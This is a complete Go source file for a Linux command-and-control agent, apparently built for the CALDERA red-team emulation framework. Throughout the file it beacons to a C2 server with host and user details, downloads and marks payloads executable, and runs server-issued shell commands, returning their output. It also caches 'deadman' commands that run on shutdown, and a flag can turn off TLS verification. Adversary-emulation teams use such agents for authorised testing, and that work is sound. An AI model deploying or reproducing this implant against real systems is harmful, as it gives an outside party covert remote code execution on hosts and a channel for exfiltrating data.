//go:build linux

package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	rdebug "runtime/debug"
	"strings"
	"sync"
	"syscall"
	"time"
)

var debug = os.Getenv("CG_DEBUG") == "1"

func dprintf(format string, a ...interface{}) {
	if debug {
		fmt.Printf(format+"\n", a...)
	}
}

type Instruction struct {
	ID            string   `json:"id"`
	Sleep         int      `json:"sleep"`
	Command       string   `json:"command"`
	Executor      string   `json:"executor"`
	Timeout       int      `json:"timeout"`
	Payloads      []string `json:"payloads"`
	Uploads       []string `json:"uploads"`
	Deadman       bool     `json:"deadman"`
	DeletePayload bool     `json:"delete_payload"`
}

func (inst *Instruction) UnmarshalJSON(data []byte) error {
	type Alias Instruction
	aux := &struct {
		Deadman       interface{} `json:"deadman"`
		DeletePayload interface{} `json:"delete_payload"`
		*Alias
	}{
		Alias: (*Alias)(inst),
	}

	if err := json.Unmarshal(data, &aux); err != nil {
		return err
	}

	inst.Deadman = parseBoolField(aux.Deadman)
	inst.DeletePayload = parseBoolField(aux.DeletePayload)
	return nil
}

func parseBoolField(val interface{}) bool {
	switch v := val.(type) {
	case bool:
		return v
	case string:
		return v == "true" || v == "1" || v == "True" || v == "TRUE"
	case float64:
		return v != 0
	default:
		return false
	}
}

type BeaconResponse struct {
	Paw          string        `json:"paw"`
	Sleep        int           `json:"sleep"`
	Watchdog     int           `json:"watchdog"`
	Instructions []Instruction `json:"instructions"`
}

type ExecutionResult struct {
	ID       string `json:"id"`
	Output   string `json:"output"`
	Stderr   string `json:"stderr"`
	ExitCode int    `json:"exit_code"`
	Status   int    `json:"status"`
	PID      int    `json:"pid"`
}

type BeaconResult struct {
	Paw     string            `json:"paw"`
	Results []ExecutionResult `json:"results"`
}

type PendingResultRecord struct {
	Result    ExecutionResult `json:"result"`
	CreatedAt time.Time       `json:"created_at"`
}

type InFlightRecord struct {
	ID        string    `json:"id"`
	StartedAt time.Time `json:"started_at"`
}

type pawState struct {
	Paw string `json:"paw"`
}

type AgentStateStore struct {
	dir         string
	pawPath     string
	pendingPath string
	inFlight    string
}

var insecureTLS = false
var httpClient *http.Client
var httpClientMu sync.Mutex

const (
	httpRequestTimeout       = 60 * time.Second
	httpDialTimeout          = 10 * time.Second
	httpTLSHandshakeTimeout  = 10 * time.Second
	httpResponseHeaderTimout = 30 * time.Second
	httpIdleConnTimeout      = 90 * time.Second
	// Per-stream output cap. Tuned high so legitimate large outputs
	// (file dumps, recursive listings, captured logs etc.) are not
	// truncated. Beyond this the truncation marker kicks in.
	maxCapturedOutputBytes   = 64 << 20 // 64 MiB per stdout / stderr stream
	pendingResultTTL         = 24 * time.Hour
	reconnectBaseDelay       = 5 * time.Second
	reconnectMaxDelay        = 60 * time.Second
	defaultMaxTimeout        = 10 * time.Minute
	maxFileWriteKB           = 1024 * 1024 // 1 GiB in 1024-byte blocks for ulimit -f
	maxPayloadBytes          = 1 << 30     // 1 GiB cap on payload downloads
	maxBeaconResponseBytes   = 256 << 20   // 256 MiB cap on beacon response body
	maxDrainBytes            = 4 << 20     // 4 MiB cap when draining unused response bodies
)

func recoverAsError(where string, errp *error) {
	if r := recover(); r != nil {
		*errp = fmt.Errorf("%s panic: %v\n%s", where, r, strings.TrimSpace(string(rdebug.Stack())))
	}
}

func getStringField(raw map[string]interface{}, key string) (string, error) {
	val, ok := raw[key]
	if !ok {
		return "", fmt.Errorf("missing %q field", key)
	}

	out, ok := val.(string)
	if !ok {
		return "", fmt.Errorf("%q field is %T, want string", key, val)
	}
	return out, nil
}

func getIntField(raw map[string]interface{}, key string) (int, error) {
	val, ok := raw[key]
	if !ok {
		return 0, fmt.Errorf("missing %q field", key)
	}

	switch v := val.(type) {
	case float64:
		return int(v), nil
	case int:
		return v, nil
	default:
		return 0, fmt.Errorf("%q field is %T, want numeric", key, val)
	}
}

func parseArgs(args []string) (server string, fresh bool, err error) {
	for i := 0; i < len(args); i++ {
		arg := args[i]
		switch strings.ToLower(arg) {
		case "-insecure", "--insecure":
			insecureTLS = true
		case "-debug", "--debug":
			debug = true
		case "--fresh", "-fresh":
			fresh = true
		case "-server", "--server":
			if i+1 >= len(args) {
				return "", false, fmt.Errorf("missing value for %s", arg)
			}
			if server != "" {
				return "", false, fmt.Errorf("multiple C2 URLs provided")
			}
			i++
			server = args[i]
		default:
			if strings.HasPrefix(arg, "-") {
				return "", false, fmt.Errorf("unknown argument: %s", arg)
			}
			if server != "" {
				return "", false, fmt.Errorf("multiple C2 URLs provided")
			}
			server = arg
		}
	}

	if server == "" {
		return "", false, fmt.Errorf("missing C2 URL")
	}
	return server, fresh, nil
}

func resolveWritableStateDir() (string, error) {
	var candidates []string
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		candidates = append(candidates, filepath.Join(home, ".caldera-agent"))
	}
	candidates = append(candidates, filepath.Join(os.TempDir(), ".caldera-agent"))

	var lastErr error
	for _, dir := range candidates {
		if err := os.MkdirAll(dir, 0o700); err != nil {
			lastErr = err
			continue
		}
		probe, err := os.CreateTemp(dir, ".probe-*")
		if err != nil {
			lastErr = err
			continue
		}
		probePath := probe.Name()
		_ = probe.Close()
		_ = os.Remove(probePath)
		return dir, nil
	}

	if lastErr == nil {
		lastErr = fmt.Errorf("no writable state directory available")
	}
	return "", lastErr
}

func newAgentStateStore() (*AgentStateStore, error) {
	dir, err := resolveWritableStateDir()
	if err != nil {
		return nil, err
	}
	return &AgentStateStore{
		dir:         dir,
		pawPath:     filepath.Join(dir, "paw.json"),
		pendingPath: filepath.Join(dir, "pending-results.json"),
		inFlight:    filepath.Join(dir, "inflight.json"),
	}, nil
}

func writeJSONAtomic(path string, data interface{}) error {
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return err
	}

	tmp, err := os.CreateTemp(dir, ".tmp-*")
	if err != nil {
		return err
	}
	tmpPath := tmp.Name()
	defer func() {
		_ = os.Remove(tmpPath)
	}()

	enc := json.NewEncoder(tmp)
	enc.SetIndent("", "  ")
	if err := enc.Encode(data); err != nil {
		_ = tmp.Close()
		return err
	}
	if err := tmp.Sync(); err != nil {
		_ = tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	return os.Rename(tmpPath, path)
}

func loadJSONFile(path string, out interface{}) error {
	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	return json.Unmarshal(data, out)
}

func (s *AgentStateStore) LoadPaw() (string, error) {
	var state pawState
	if err := loadJSONFile(s.pawPath, &state); err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return "", nil
		}
		return "", err
	}
	return state.Paw, nil
}

func (s *AgentStateStore) SavePaw(paw string) error {
	return writeJSONAtomic(s.pawPath, pawState{Paw: paw})
}

func (s *AgentStateStore) ClearPaw() error {
	if err := os.Remove(s.pawPath); err != nil && !errors.Is(err, os.ErrNotExist) {
		return err
	}
	return nil
}

func (s *AgentStateStore) LoadPendingResults() ([]PendingResultRecord, error) {
	var pending []PendingResultRecord
	if err := loadJSONFile(s.pendingPath, &pending); err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return nil, nil
		}
		return nil, err
	}
	return pending, nil
}

func (s *AgentStateStore) SavePendingResults(pending []PendingResultRecord) error {
	if len(pending) == 0 {
		if err := os.Remove(s.pendingPath); err != nil && !errors.Is(err, os.ErrNotExist) {
			return err
		}
		return nil
	}
	return writeJSONAtomic(s.pendingPath, pending)
}

func (s *AgentStateStore) LoadInFlight() (*InFlightRecord, error) {
	var inFlight InFlightRecord
	if err := loadJSONFile(s.inFlight, &inFlight); err != nil {
		if errors.Is(err, os.ErrNotExist) {
			return nil, nil
		}
		return nil, err
	}
	return &inFlight, nil
}

func (s *AgentStateStore) SaveInFlight(rec InFlightRecord) error {
	return writeJSONAtomic(s.inFlight, rec)
}

func (s *AgentStateStore) ClearInFlight() error {
	if err := os.Remove(s.inFlight); err != nil && !errors.Is(err, os.ErrNotExist) {
		return err
	}
	return nil
}

func (s *AgentStateStore) ClearAll() error {
	if err := s.ClearPaw(); err != nil {
		return err
	}
	if err := s.SavePendingResults(nil); err != nil {
		return err
	}
	return s.ClearInFlight()
}

func pruneExpiredPending(now time.Time, pending []PendingResultRecord) []PendingResultRecord {
	if len(pending) == 0 {
		return nil
	}
	kept := pending[:0]
	for _, item := range pending {
		if item.CreatedAt.IsZero() {
			item.CreatedAt = now
		}
		if now.Sub(item.CreatedAt) > pendingResultTTL {
			dprintf("[DEBUG] Dropping stale pending result for id=%s", item.Result.ID)
			continue
		}
		kept = append(kept, item)
	}
	return kept
}

func hasPendingResultForID(pending []PendingResultRecord, id string) bool {
	for _, item := range pending {
		if item.Result.ID == id {
			return true
		}
	}
	return false
}

func makeErrorResult(id, message string) ExecutionResult {
	return ExecutionResult{
		ID:       id,
		Stderr:   base64.StdEncoding.EncodeToString([]byte(message)),
		ExitCode: 1,
		Status:   1,
	}
}

func makeInterruptedResult(rec InFlightRecord) PendingResultRecord {
	return PendingResultRecord{
		Result:    makeErrorResult(rec.ID, "instruction interrupted by agent restart before result acknowledgement"),
		CreatedAt: time.Now().UTC(),
	}
}

func queuePendingResult(store *AgentStateStore, pending []PendingResultRecord, result ExecutionResult) ([]PendingResultRecord, error) {
	pending = append(pruneExpiredPending(time.Now().UTC(), pending), PendingResultRecord{
		Result:    result,
		CreatedAt: time.Now().UTC(),
	})
	if err := store.SavePendingResults(pending); err != nil {
		return pending, err
	}
	return pending, nil
}

func flushPendingResults(store *AgentStateStore, server, paw string, pending []PendingResultRecord) ([]PendingResultRecord, error) {
	pending = pruneExpiredPending(time.Now().UTC(), pending)
	if err := store.SavePendingResults(pending); err != nil {
		return pending, err
	}
	if len(pending) == 0 || paw == "" {
		return pending, nil
	}

	// Send results one at a time (matching sandcat behavior) so no single
	// POST can exceed the server's client_max_size limit.
	for len(pending) > 0 {
		item := pending[0]
		if err := sendResults(server, paw, []ExecutionResult{item.Result}); err != nil {
			// Save remaining pending results so we can retry next cycle.
			_ = store.SavePendingResults(pending)
			return pending, err
		}
		// Successfully sent — remove from queue and persist.
		pending = pending[1:]
		if err := store.SavePendingResults(pending); err != nil {
			return pending, err
		}
		dprintf("[DEBUG] Flushed result id=%s (%d remaining)", item.Result.ID, len(pending))
	}
	return nil, nil
}

func reconnectDelay(failures int) time.Duration {
	if failures <= 0 {
		return reconnectBaseDelay
	}
	delay := reconnectBaseDelay
	for i := 1; i < failures; i++ {
		delay *= 2
		if delay >= reconnectMaxDelay {
			return reconnectMaxDelay
		}
	}
	return delay
}

func shouldRetryWithoutPaw(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "unexpected HTTP status: 400") || strings.Contains(msg, "unexpected HTTP status: 404")
}

func parseInstructions(raw interface{}) ([]Instruction, error) {
	var list []Instruction

	rawStr, ok := raw.(string)
	if !ok {
		return nil, fmt.Errorf("instructions field is not a string")
	}

	var jsonStrings []string
	if err := json.Unmarshal([]byte(rawStr), &jsonStrings); err != nil {
		return nil, fmt.Errorf("nested unmarshal failed: %v", err)
	}

	for _, s := range jsonStrings {
		var inst Instruction
		if err := json.Unmarshal([]byte(s), &inst); err != nil {
			fmt.Println("[ERROR] could not unmarshal instruction:", err)
			continue
		}
		list = append(list, inst)
	}
	return list, nil
}

func getHTTPClient() *http.Client {
	httpClientMu.Lock()
	defer httpClientMu.Unlock()

	if httpClient != nil {
		return httpClient
	}

	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		DialContext: (&net.Dialer{
			Timeout:   httpDialTimeout,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		ForceAttemptHTTP2:     true,
		MaxIdleConns:          10,
		IdleConnTimeout:       httpIdleConnTimeout,
		TLSHandshakeTimeout:   httpTLSHandshakeTimeout,
		ResponseHeaderTimeout: httpResponseHeaderTimout,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: insecureTLS},
	}

	httpClient = &http.Client{
		Timeout:   httpRequestTimeout,
		Transport: transport,
	}
	return httpClient
}

func drainAndClose(resp *http.Response) {
	if resp == nil || resp.Body == nil {
		return
	}
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, maxDrainBytes))
	_ = resp.Body.Close()
}

func postEncodedBeacon(server, encoded string) (*http.Response, error) {
	dprintf("[DEBUG] POST %s/beacon", server)
	return getHTTPClient().Post(server+"/beacon", "text/plain", bytes.NewBuffer([]byte(encoded)))
}

func sendResults(server, paw string, results []ExecutionResult) error {
	jsonResults, err := json.Marshal(BeaconResult{Paw: paw, Results: results})
	if err != nil {
		return fmt.Errorf("marshal results: %w", err)
	}

	encoded := base64.StdEncoding.EncodeToString(jsonResults)
	dprintf("[DEBUG] Result post start: paw=%s count=%d", paw, len(results))

	resp, err := postEncodedBeacon(server, encoded)
	if err != nil {
		return err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("result post HTTP %d", resp.StatusCode)
	}

	dprintf("[DEBUG] Result post end: paw=%s count=%d", paw, len(results))
	return nil
}

func sendBeacon(server string, data map[string]interface{}) (_ *BeaconResponse, err error) {
	defer recoverAsError("sendBeacon", &err)

	dprintf("[DEBUG] Beacon request start: %s/beacon", server)

	jsonData, _ := json.Marshal(data)
	encoded := base64.StdEncoding.EncodeToString(jsonData)

	resp, err := postEncodedBeacon(server, encoded)
	if err != nil {
		return nil, err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("unexpected HTTP status: %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, maxBeaconResponseBytes))
	if err != nil {
		return nil, fmt.Errorf("read beacon body failed: %v", err)
	}
	if len(body) == 0 {
		return nil, fmt.Errorf("empty body from server")
	}

	decoded, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	dprintf("[DEBUG] Server response: %s", string(decoded))

	var raw map[string]interface{}
	if err := json.Unmarshal(decoded, &raw); err != nil {
		return nil, fmt.Errorf("json unmarshal failed: %v", err)
	}

	var br BeaconResponse
	if br.Paw, err = getStringField(raw, "paw"); err != nil {
		return nil, err
	}
	if br.Sleep, err = getIntField(raw, "sleep"); err != nil {
		return nil, err
	}
	if br.Watchdog, err = getIntField(raw, "watchdog"); err != nil {
		return nil, err
	}

	instructions, err := parseInstructions(raw["instructions"])
	if err != nil {
		return nil, err
	}
	br.Instructions = instructions

	dprintf("[DEBUG] Beacon response parsed: paw=%s sleep=%d watchdog=%d tasks=%d", br.Paw, br.Sleep, br.Watchdog, len(br.Instructions))

	return &br, nil
}

func downloadPayload(server, name string) error {
	url := server + "/file/download"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		return err
	}
	req.Header.Set("file", name)
	dprintf("[DEBUG] Payload download start: %s", name)

	resp, err := getHTTPClient().Do(req)
	if err != nil {
		return err
	}
	defer drainAndClose(resp)

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("payload download HTTP %d", resp.StatusCode)
	}

	// Cap download size to prevent OOM from oversized payloads.
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxPayloadBytes))
	if err != nil {
		return err
	}
	// Sanitize filename to prevent path traversal (e.g. "../../.bashrc").
	safeName := filepath.Base(name)
	if err := os.WriteFile(safeName, data, 0755); err != nil {
		return err
	}
	dprintf("[DEBUG] Payload download end: %s (%d bytes)", safeName, len(data))
	return nil
}

func createCaptureFile(prefix string) (*os.File, error) {
	file, err := os.CreateTemp("", prefix)
	if err != nil {
		return nil, err
	}
	return file, nil
}

func readCappedFile(path string, limit int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	info, err := file.Stat()
	if err != nil {
		return nil, err
	}

	var buf bytes.Buffer
	if _, err := io.CopyN(&buf, file, limit+1); err != nil && err != io.EOF {
		return nil, err
	}

	data := buf.Bytes()
	truncated := info.Size() > limit || int64(len(data)) > limit
	if int64(len(data)) > limit {
		data = data[:limit]
	}
	if truncated {
		data = append(data, []byte(fmt.Sprintf("\n[output truncated after %d bytes]", limit))...)
	}
	return data, nil
}

func runInstruction(parent context.Context, inst Instruction) ExecutionResult {
	out := ExecutionResult{ID: inst.ID}

	cmdBytes, err := base64.StdEncoding.DecodeString(inst.Command)
	if err != nil {
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	dprintf("[DEBUG] Command start: id=%s timeout=%d executor=%s", inst.ID, inst.Timeout, inst.Executor)
	dprintf("[DEBUG] Exec: %s", string(cmdBytes))

	if parent == nil {
		parent = context.Background()
	}

	ctx := parent
	var cancel context.CancelFunc
	if inst.Timeout > 0 {
		ctx, cancel = context.WithTimeout(ctx, time.Duration(inst.Timeout)*time.Second)
	} else {
		// Always enforce a ceiling so no command can hang forever.
		ctx, cancel = context.WithTimeout(ctx, defaultMaxTimeout)
	}

	// Wrap with ulimit -f to cap file writes per process (prevents disk-fill attacks like cat /dev/zero > file).
	wrappedCmd := fmt.Sprintf("ulimit -f %d 2>/dev/null; %s", maxFileWriteKB, string(cmdBytes))
	cmd := exec.CommandContext(ctx, "sh", "-c", wrappedCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}

	stdoutFile, err := createCaptureFile("caldera-stdout-*")
	if err != nil {
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}
	defer func() {
		_ = os.Remove(stdoutFile.Name())
	}()

	stderrFile, err := createCaptureFile("caldera-stderr-*")
	if err != nil {
		_ = stdoutFile.Close()
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}
	defer func() {
		_ = os.Remove(stderrFile.Name())
	}()

	cmd.Stdout = stdoutFile
	cmd.Stderr = stderrFile

	if err := cmd.Start(); err != nil {
		cancel()
		_ = stdoutFile.Close()
		_ = stderrFile.Close()
		out.Stderr = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		out.ExitCode = 1
		return out
	}

	done := make(chan struct{})
	go func(pid int) {
		select {
		case <-done:
			return
		case <-ctx.Done():
		}
		if ctx.Err() == nil {
			return
		}
		dprintf("[DEBUG] Context ended for id=%s pid=%d (%v), killing process group", inst.ID, pid, ctx.Err())
		if err := syscall.Kill(-pid, syscall.SIGKILL); err != nil && err != syscall.ESRCH {
			dprintf("[DEBUG] Process group kill failed for pid=%d: %v", pid, err)
		}
	}(cmd.Process.Pid)

	waitErr := cmd.Wait()
	close(done)
	ctxErr := ctx.Err()
	cancel()
	_ = stdoutFile.Close()
	_ = stderrFile.Close()

	blocked := 0
	exitCode := 0

	if waitErr != nil {
		if ctxErr == context.DeadlineExceeded {
			exitCode = 124
			blocked = 1
		} else if ctxErr == context.Canceled {
			exitCode = 130
			blocked = 1
		} else if exitErr, ok := waitErr.(*exec.ExitError); ok {
			ws := exitErr.Sys().(syscall.WaitStatus)
			if ws.Signaled() {
				if ws.Signal() == syscall.SIGKILL {
					blocked = 1
				}
				exitCode = 128 + int(ws.Signal())
			} else {
				exitCode = ws.ExitStatus()
			}
		} else {
			blocked = 1
			exitCode = 1
		}
	}

	stdoutBytes, err := readCappedFile(stdoutFile.Name(), maxCapturedOutputBytes)
	if err != nil {
		stdoutBytes = []byte{}
		dprintf("[DEBUG] stdout read failed for id=%s: %v", inst.ID, err)
	}
	stderrBytes, err := readCappedFile(stderrFile.Name(), maxCapturedOutputBytes)
	if err != nil {
		stderrBytes = append(stderrBytes, []byte(fmt.Sprintf("stderr read failed: %v", err))...)
		dprintf("[DEBUG] stderr read failed for id=%s: %v", inst.ID, err)
	}

	out.Output = base64.StdEncoding.EncodeToString(stdoutBytes)
	out.Stderr = base64.StdEncoding.EncodeToString(stderrBytes)
	out.ExitCode = exitCode
	out.Status = blocked
	if cmd.ProcessState != nil {
		out.PID = cmd.ProcessState.Pid()
	}

	dprintf("[DEBUG] Command end: id=%s pid=%d exit=%d blocked=%d", out.ID, out.PID, out.ExitCode, out.Status)

	return out
}

func buildAgentProfile(exePath string) map[string]interface{} {
	hostname, _ := os.Hostname()
	var ipList []string
	ifaces, _ := net.Interfaces()
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip == nil || ip.IsLoopback() {
				continue
			}
			if ipv4 := ip.To4(); ipv4 != nil {
				ipList = append(ipList, ipv4.String())
			}
		}
	}

	privilege := "User"
	if os.Geteuid() == 0 {
		privilege = "Elevated"
	}

	return map[string]interface{}{
		"platform":        runtime.GOOS,
		"host":            hostname,
		"display_name":    hostname,
		"group":           "red",
		"username":        os.Getenv("USER"),
		"architecture":    runtime.GOARCH,
		"executors":       []string{"sh"},
		"privilege":       privilege,
		"pid":             os.Getpid(),
		"ppid":            os.Getppid(),
		"location":        exePath,
		"exe_name":        exePath,
		"host_ip_addrs":   ipList,
		"deadman_enabled": true,
	}
}

func runDeadmanInstructions(deadman []Instruction) {
	if len(deadman) == 0 {
		return
	}
	dprintf("[DEBUG] Running %d deadman instructions", len(deadman))
	for _, inst := range deadman {
		res := runInstruction(context.Background(), inst)
		dprintf("[DEBUG] Deadman result: id=%s exit=%d blocked=%d", res.ID, res.ExitCode, res.Status)
	}
}

func waitWithSignal(delay time.Duration, terminateCh <-chan string, terminateReason *string) bool {
	if *terminateReason != "" {
		return true
	}
	if delay <= 0 {
		select {
		case reason := <-terminateCh:
			*terminateReason = reason
			return true
		default:
			return false
		}
	}

	timer := time.NewTimer(delay)
	defer timer.Stop()

	select {
	case reason := <-terminateCh:
		*terminateReason = reason
		return true
	case <-timer.C:
		return false
	}
}

func run() (err error) {
	defer recoverAsError("main", &err)

	server, fresh, err := parseArgs(os.Args[1:])
	if err != nil {
		fmt.Println("Usage:", os.Args[0], "<C2 URL> [-insecure] [-debug] [--fresh]")
		fmt.Println("   or:", os.Args[0], "-server <C2 URL> [-insecure] [-debug] [--fresh]")
		return err
	}
	if insecureTLS {
		insecureTLS = true
		fmt.Println("[WARN] TLS certificate verification is disabled")
	}

	store, err := newAgentStateStore()
	if err != nil {
		return fmt.Errorf("resolve state store: %w", err)
	}
	if fresh {
		if err := store.ClearAll(); err != nil {
			return fmt.Errorf("clear persisted state for --fresh: %w", err)
		}
	}

	agent := buildAgentProfile(os.Args[0])

	persistedPaw := ""
	if !fresh {
		persistedPaw, err = store.LoadPaw()
		if err != nil {
			return fmt.Errorf("load paw: %w", err)
		}
		if persistedPaw != "" {
			agent["paw"] = persistedPaw
			dprintf("[DEBUG] Loaded persisted paw: %s", persistedPaw)
		}
	}

	pending, err := store.LoadPendingResults()
	if err != nil {
		return fmt.Errorf("load pending results: %w", err)
	}
	pending = pruneExpiredPending(time.Now().UTC(), pending)
	if err := store.SavePendingResults(pending); err != nil {
		return fmt.Errorf("persist pending results: %w", err)
	}

	if !fresh {
		inFlight, err := store.LoadInFlight()
		if err != nil {
			return fmt.Errorf("load in-flight record: %w", err)
		}
		if inFlight != nil && !hasPendingResultForID(pending, inFlight.ID) {
			pending = append(pending, makeInterruptedResult(*inFlight))
			if err := store.SavePendingResults(pending); err != nil {
				return fmt.Errorf("persist recovered in-flight result: %w", err)
			}
		}
		if inFlight != nil {
			if err := store.ClearInFlight(); err != nil {
				return fmt.Errorf("clear recovered in-flight record: %w", err)
			}
		}
	}

	consecutiveFailures := 0
	retriedWithoutPaw := false
	deadmanInstructions := make([]Instruction, 0)
	lastSuccessfulBeacon := time.Time{}
	watchdogSeconds := 0
	terminateReason := ""

	signalCh := make(chan os.Signal, 1)
	terminateCh := make(chan string, 1)
	signal.Notify(signalCh, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(signalCh)

	agentCtx, agentCancel := context.WithCancel(context.Background())
	defer agentCancel()

	go func() {
		sig := <-signalCh
		select {
		case terminateCh <- sig.String():
		default:
		}
		agentCancel()
	}()

	for {
		if waitWithSignal(0, terminateCh, &terminateReason) {
			runDeadmanInstructions(deadmanInstructions)
			return fmt.Errorf("termination requested via signal: %s", terminateReason)
		}

		resp, err := sendBeacon(server, agent)
		if err != nil {
			if persistedPaw != "" && !retriedWithoutPaw && shouldRetryWithoutPaw(err) {
				dprintf("[DEBUG] Persisted paw rejected, retrying without it: %v", err)
				retriedWithoutPaw = true
				persistedPaw = ""
				delete(agent, "paw")
				if err := store.ClearPaw(); err != nil {
					return fmt.Errorf("clear rejected paw: %w", err)
				}
				pending = nil
				if err := store.SavePendingResults(nil); err != nil {
					return fmt.Errorf("clear pending results after paw rejection: %w", err)
				}
				if err := store.ClearInFlight(); err != nil {
					return fmt.Errorf("clear in-flight after paw rejection: %w", err)
				}
				continue
			}
			consecutiveFailures++
			fmt.Println("[ERROR] beacon:", err)
			delay := reconnectDelay(consecutiveFailures)
			dprintf("[DEBUG] Beacon failure count=%d backoff=%s", consecutiveFailures, delay)
			if watchdogSeconds > 0 && !lastSuccessfulBeacon.IsZero() && time.Since(lastSuccessfulBeacon) > time.Duration(watchdogSeconds)*time.Second {
				runDeadmanInstructions(deadmanInstructions)
				return fmt.Errorf("watchdog expired after %d seconds without beacon", watchdogSeconds)
			}
			if waitWithSignal(delay, terminateCh, &terminateReason) {
				runDeadmanInstructions(deadmanInstructions)
				return fmt.Errorf("termination requested via signal: %s", terminateReason)
			}
			continue
		}
		consecutiveFailures = 0
		retriedWithoutPaw = false
		dprintf("[DEBUG] Beacon OK – paw=%s, tasks=%d", resp.Paw, len(resp.Instructions))
		lastSuccessfulBeacon = time.Now().UTC()
		watchdogSeconds = resp.Watchdog

		if resp.Paw != "" {
			agent["paw"] = resp.Paw
			if persistedPaw != "" && resp.Paw != persistedPaw {
				dprintf("[DEBUG] Server assigned a new paw, dropping pending state from old identity")
				pending = nil
				if err := store.SavePendingResults(nil); err != nil {
					return fmt.Errorf("clear pending results after paw change: %w", err)
				}
				if err := store.ClearInFlight(); err != nil {
					return fmt.Errorf("clear in-flight after paw change: %w", err)
				}
			}
			if resp.Paw != persistedPaw {
				if err := store.SavePaw(resp.Paw); err != nil {
					return fmt.Errorf("persist paw: %w", err)
				}
				persistedPaw = resp.Paw
			}
		}

		if len(pending) > 0 {
			pending, err = flushPendingResults(store, server, resp.Paw, pending)
			if err != nil {
				consecutiveFailures++
				fmt.Println("[ERROR] flush pending results:", err)
				time.Sleep(reconnectDelay(consecutiveFailures))
				continue
			}
		}

		for _, inst := range resp.Instructions {
			if inst.Deadman {
				deadmanInstructions = append(deadmanInstructions, inst)
				dprintf("[DEBUG] Cached deadman instruction: id=%s", inst.ID)
				continue
			}

			inFlight := InFlightRecord{
				ID:        inst.ID,
				StartedAt: time.Now().UTC(),
			}
			if err := store.SaveInFlight(inFlight); err != nil {
				pending, err = queuePendingResult(store, pending, makeErrorResult(inst.ID, fmt.Sprintf("instruction not executed because in-flight persistence failed: %v", err)))
				if err != nil {
					return fmt.Errorf("persist local failure result for %s: %w", inst.ID, err)
				}
				continue
			}

			for _, p := range inst.Payloads {
				if err := downloadPayload(server, p); err != nil {
					fmt.Println("[ERROR] payload:", err)
				}
			}

			res := runInstruction(agentCtx, inst)
			pending, err = queuePendingResult(store, pending, res)
			if err != nil {
				return fmt.Errorf("persist pending result for %s: %w", inst.ID, err)
			}
			if err := store.ClearInFlight(); err != nil {
				return fmt.Errorf("clear in-flight for %s: %w", inst.ID, err)
			}

			if inst.DeletePayload {
				for _, p := range inst.Payloads {
					if err := os.Remove(p); err == nil {
						dprintf("[DEBUG] Payload removed: %s", p)
					}
				}
			}

			// Flush results immediately after each instruction (not batched)
			// so we deliver results sooner and avoid accumulating a payload
			// that exceeds the server's client_max_size limit.
			if len(pending) > 0 {
				pending, err = flushPendingResults(store, server, resp.Paw, pending)
				if err != nil {
					fmt.Println("[WARN] flush after instruction:", err, "— will retry next cycle")
					// Do NOT break or continue here. Keep executing remaining
					// instructions so they aren't lost (server already marked
					// them as collected).
				}
			}

			if waitWithSignal(time.Duration(inst.Sleep)*time.Second, terminateCh, &terminateReason) {
				runDeadmanInstructions(deadmanInstructions)
				return fmt.Errorf("termination requested via signal: %s", terminateReason)
			}
		}

		if waitWithSignal(time.Duration(resp.Sleep)*time.Second, terminateCh, &terminateReason) {
			runDeadmanInstructions(deadmanInstructions)
			return fmt.Errorf("termination requested via signal: %s", terminateReason)
		}
	}
}

func main() {
	if err := run(); err != nil {
		fmt.Println("[ERROR]", err)
		os.Exit(1)
	}
}
